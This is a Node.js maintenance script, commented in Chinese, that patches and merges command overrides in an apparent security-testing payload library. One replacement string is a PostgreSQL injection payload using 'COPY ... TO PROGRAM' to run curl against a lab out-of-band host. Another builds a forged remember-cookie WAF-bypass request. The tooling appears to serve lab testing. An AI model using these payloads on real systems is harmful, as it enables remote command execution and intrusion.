#!/usr/bin/env node
/**
 * p0fix 补丁合并：id 已存在于其他 command-override 文档 → 原 entry 整体搬入 p0fix，同 (area,index) 合并；
 * 同时补齐此前 2 处失败修复（COPY 行、remember waf[1]）。
 */
const fs = require('fs');
const path = require('path');
const { DatabaseSync } = require('node:sqlite');
const ROOT = path.resolve(__dirname, '..');
const CR = p => path.join(ROOT, 'content-review', p);

const DOC = 'payload-command-overrides-p0fix-2026-09.json';
const manifest = JSON.parse(fs.readFileSync(CR('manifest.json'), 'utf8'));
const p0fix = JSON.parse(fs.readFileSync(CR(DOC), 'utf8'));
const others = manifest.payloadCommandOverrideFiles
  .filter(f => f !== DOC)
  .map(f => ({ file: f, doc: JSON.parse(fs.readFileSync(CR(f), 'utf8')) }));

// ── 补齐 2 处失败修复 ──
const db = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
const get = id => JSON.parse(db.prepare('SELECT data FROM payloads WHERE id=?').get(id).data);
const oob = get('httpbypass-oob-sql-network-resolution');
const oobCmd = oob.execution[0].command;
const mCopy = /'\|\|;COPY%20users\(names\)%20FROM%20'.*$/.exec(oobCmd);
const rt = get('auth-remember-token-integrity');
const cmd1 = rt.wafBypass[1].command;
const re1 = /^printf "%s" "(.+)" \| base64 -w0 ((?:\| tr [^|]+)*) \| curl -sS --max-time 5 -b "remember=@-" (.+)$/s;
db.close();

const push = (id, patch) => {
  let e = p0fix.entries.find(x => x.id === id);
  if (!e) { e = { id, patches: [] }; p0fix.entries.push(e); }
  e.patches.push(patch);
};
if (mCopy) {
  push('httpbypass-oob-sql-network-resolution', {
    area: 'execution', index: 0, expectedCommand: oobCmd,
    command: oobCmd.replace(mCopy[0], "';+COPY%20(SELECT%20version())%20TO%20PROGRAM%20''curl%20http://{LAB_OAST}'';+--"),
  });
  console.log('✓ COPY 行补齐');
} else console.log('✗ COPY 行未命中');
if (re1.test(cmd1)) {
  push('auth-remember-token-integrity', {
    area: 'wafBypass', index: 1, expectedCommand: cmd1,
    command: cmd1.replace(re1, 'V=$(printf "%s" "$1" | base64 -w0$2); curl -sS --max-time 5 -b "remember=$V" $3'),
  });
  console.log('✓ remember waf[1] 补齐');
} else console.log('✗ remember waf[1] 未命中');

// ── id 搬迁合并 ──
const key = pa => `${pa.area}|${pa.index}`;
const finalEntries = [];
let moved = 0, merged = 0;
const touched = new Map();
for (const myEntry of p0fix.entries) {
  const src = others.find(o => (o.doc.entries || []).some(e => e.id === myEntry.id));
  if (!src) { finalEntries.push(myEntry); continue; }
  const idx = src.doc.entries.findIndex(e => e.id === myEntry.id);
  const [orig] = src.doc.entries.splice(idx, 1);
  touched.set(src.file, src.doc);
  moved++;
  const byKey = new Map(orig.patches.map(pa => [key(pa), { ...pa }]));
  for (const my of myEntry.patches) {
    const k = key(my);
    if (byKey.has(k)) {
      const o = byKey.get(k);
      if (o.expectedCommand !== my.expectedCommand) {
        // 原补丁锚的是更早版本命令——以 my（DB 现值锚定）为准，orig 的 command/description 若存在则丢弃并告警
        console.log(`⚠️ ${myEntry.id} ${k} 原 expectedCommand 不一致，以 DB 现值锚为准`);
        byKey.set(k, { ...o, expectedCommand: my.expectedCommand, command: my.command });
      } else {
        byKey.set(k, { ...o, command: my.command });
      }
      merged++;
    } else byKey.set(k, my);
  }
  orig.patches = [...byKey.values()];
  finalEntries.push(orig);
}
p0fix.entries = finalEntries;
fs.writeFileSync(CR(DOC), JSON.stringify(p0fix, null, 2) + '\n');
for (const [f, doc] of touched) fs.writeFileSync(CR(f), JSON.stringify(doc, null, 2) + '\n');
console.log(`搬迁 ${moved} / 同目标合并 ${merged} / p0fix 总条目 ${finalEntries.length} / 总补丁 ${finalEntries.reduce((s, e) => s + e.patches.length, 0)}`);
